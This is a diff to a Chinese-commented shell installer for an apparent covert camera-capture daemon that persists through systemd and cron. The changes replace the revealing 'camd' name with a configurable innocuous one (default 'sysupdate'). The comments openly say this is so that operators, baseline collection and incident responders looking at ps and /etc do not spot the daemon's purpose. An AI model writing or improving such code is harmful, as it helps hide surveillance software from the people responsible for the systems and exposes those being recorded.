@@ -56,23 +56,62 @@ while [ $# -gt 0 ]; do
         --front-host) FRONT_HOST="$2"; shift 2 ;;
         --ca)         CA_SRC="$2"; shift 2 ;;
         --unit-desc) UNIT_DESC="$2"; shift 2 ;;
+        --name)       NAME="$2"; shift 2 ;;
         --prefix)     PREFIX="$2"; shift 2 ;;
         install|uninstall|status|checkpayload|renderunit) ACTION="$1"; shift ;;
         *) printf '未知参数: %s\n' "$1"; exit 2 ;;
     esac
 done
 
+# ---- 命名派生 --------------------------------------------------------------
+# 【命名体系伪装】此前 camd 这个前缀同时出现在 conf 目录、二进制名、服务名、
+# cron 名、锁文件名里——字面即 "camera daemon"。运维扫一眼 ps 或 /etc 就能
+# 读出意图，而 ps 与 /etc 是巡检、基线采集、应急响应最先看的两处。
+# 改为全部落点由单一 $NAME 派生，默认中性、可 --name 覆盖为目标环境里
+# 看着眼熟的服务名。
+#
+# 默认值 sysupdate：系统更新类守护在 Linux 上普遍存在，不带语义指向。
+NAME="${NAME:-sysupdate}"
+
+validate_name() {
+    # 四项校验，缺一项都会造成"看起来装上了、实际是灾难"：
+    #
+    #  a) 非空 / 不含 / —— 直接拼进路径，../../ 会写到任意位置（路径穿越）。
+    #  b) 字符集 [a-z0-9_-] 且首字符字母数字 —— systemd 单元名与 cron.d
+    #     文件名都有约束；点号会让 systemd 把 .service 之外的部分当后缀。
+    #  c) 长度 <= 15 —— 内核 comm 是 15 字符 + NUL（TASK_COMM_LEN=16），
+    #     超长会被截断，于是安装时按 $NAME 匹配、运行时 comm 却是截断值，
+    #     "进程已清理" 与 status 的进程计数全部静默失效。这条最阴：
+    #     功能一切正常，只是卸载时杀不掉。
+    case "$NAME" in
+        '') DIE "--name 不得为空" ;;
+        */*) DIE "--name 不得含 / : $NAME（会路径穿越）" ;;
+    esac
+    case "$NAME" in
+        *[!a-z0-9_-]*) DIE "--name 只允许 [a-z0-9_-] : $NAME" ;;
+    esac
+    case "$NAME" in
+        [-_]*) DIE "--name 首字符必须是字母或数字 : $NAME" ;;
+    esac
+    if [ ${#NAME} -gt 15 ]; then
+        DIE "--name 长度不得超过 15（内核 comm 截断）: $NAME"
+    fi
+}
+validate_name
+
 # ---- 路径派生 --------------------------------------------------------------
-# 全部由 $PREFIX 派生，脚本其余部分一律只用这些变量、不得再写绝对路径。
-# 此前是硬编码 /etc/camd 等，结果是：守卫每跑一次就往真实 /etc 写一遍，
-# 两份不同配置的部署在同一台机器上会互相覆盖，且无法并行。
-CONF_DIR=$PREFIX/etc/camd
-CONF_FILE=$CONF_DIR/camd.conf
-LIB_DIR=$PREFIX/var/lib/camd
-BIN_DST=$PREFIX/usr/local/bin/camd
-UNIT=$PREFIX/etc/systemd/system/camd.service
-CRON=$PREFIX/etc/cron.d/camd
-LOCK=$PREFIX/var/lock/camd.lock
+# 全部由 $PREFIX 与 $NAME 派生，脚本其余部分一律只用这些变量、不得再写
+# 绝对路径或字面服务名。此前是硬编码 /etc/camd 等，结果是：守卫每跑一次
+# 就往真实 /etc 写一遍，两份不同配置的部署在同一台机器上会互相覆盖，
+# 且无法并行。
+CONF_DIR=$PREFIX/etc/$NAME
+CONF_FILE=$CONF_DIR/$NAME.conf
+LIB_DIR=$PREFIX/var/lib/$NAME
+BIN_DST=$PREFIX/usr/local/bin/$NAME
+UNIT=$PREFIX/etc/systemd/system/$NAME.service
+CRON=$PREFIX/etc/cron.d/$NAME
+LOCK=$PREFIX/var/lock/$NAME.lock
+UNIT_NAME=$NAME.service
 # 单元描述。默认中性：此前写死 "Camera Service"，直接点明功能。单元文件
 # 是 0644、常进配置管理与审计采集，运维一条 systemctl status 或 cat 就能
 # 读出意图，而该字段对运行毫无作用——纯暴露面。可用 --unit-desc 覆盖为
@@ -427,8 +466,8 @@ persist_systemd() {
     # 失败语义：die。只 warn 会留下"驻留成功"的假象。
     command -v systemctl >/dev/null 2>&1 || { DIE "systemctl 不存在"; }
     systemctl daemon-reload >/dev/null 2>&1 \
-        && systemctl enable camd.service >/dev/null 2>&1 \
-        && systemctl restart camd.service >/dev/null 2>&1 \
+        && systemctl enable $UNIT_NAME >/dev/null 2>&1 \
+        && systemctl restart $UNIT_NAME >/dev/null 2>&1 \
         || { rm -f "$UNIT"; systemctl daemon-reload >/dev/null 2>&1; \
              DIE "systemd 驻留失败（单元已回滚）"; }
     # 存活判据（真 systemd 实测踩出来的）：restart 返回 0 **不代表服务活着**。
@@ -437,11 +476,11 @@ persist_systemd() {
     # 部署侧全绿，而实际一帧都没采集，还留下密集的失败 journal。
     # 判据必须是"重启后仍 active 且 MainPID 非 0"。
     sleep 3
-    A=$(systemctl is-active camd.service 2>/dev/null)
-    M=$(systemctl show -p MainPID --value camd.service 2>/dev/null)
+    A=$(systemctl is-active $UNIT_NAME 2>/dev/null)
+    M=$(systemctl show -p MainPID --value $UNIT_NAME 2>/dev/null)
     if [ "$A" != "active" ] || [ -z "$M" ] || [ "$M" = "0" ]; then
-        J=$(journalctl -u camd.service -n 5 --no-pager 2>/dev/null | tail -5)
-        systemctl disable --now camd.service >/dev/null 2>&1
+        J=$(journalctl -u $UNIT_NAME -n 5 --no-pager 2>/dev/null | tail -5)
+        systemctl disable --now $UNIT_NAME >/dev/null 2>&1
         rm -f "$UNIT"
         systemctl daemon-reload >/dev/null 2>&1
         DIE "systemd 驻留后服务未存活（active=$A MainPID=$M）: ${J:-无 journal}"
@@ -619,7 +658,7 @@ do_uninstall() {
 
     # 顺序：先 disable --now 再删单元。只 stop 的话 Restart=always 会被拉起。
     if [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
-        systemctl disable --now camd.service >/dev/null 2>&1
+        systemctl disable --now $UNIT_NAME >/dev/null 2>&1
         rm -f "$UNIT"
         systemctl daemon-reload >/dev/null 2>&1
         systemctl reset-failed >/dev/null 2>&1
@@ -639,7 +678,8 @@ do_uninstall() {
     if [ "$FAKE_ROOT" = 1 ]; then
         WARN "假根模式：跳过按 comm 杀进程（无法区分归属，会误伤真实部署）"
     else
-        for P in $(ps -eo pid=,comm= 2>/dev/null | awk '$2=="camd"{print $1}'); do
+        # comm 截断：已在 validate_name 限制 NAME <= 15，故 comm 与 $NAME 恒等。
+    for P in $(ps -eo pid=,comm= 2>/dev/null | awk -v n="$NAME" '$2==n{print $1}'); do
             kill -TERM "$P" 2>/dev/null
         done
         OK "进程已清理"
@@ -654,7 +694,7 @@ do_status() {
     printf '二进制: %s\n' "$([ -x "$BIN_DST" ] && echo 存在 || echo 缺失)"
     printf 'systemd 单元: %s\n' "$([ -f "$UNIT" ] && echo 存在 || echo 缺失)"
     printf 'cron 条目: %s\n' "$([ -f "$CRON" ] && echo 存在 || echo 缺失)"
-    printf '运行进程: %s\n' "$(ps -eo comm= 2>/dev/null | grep -c '^camd$')"
+    printf '运行进程: %s\n' "$(ps -eo comm= 2>/dev/null | grep -c -x "$NAME")"
     return 0
 }
 
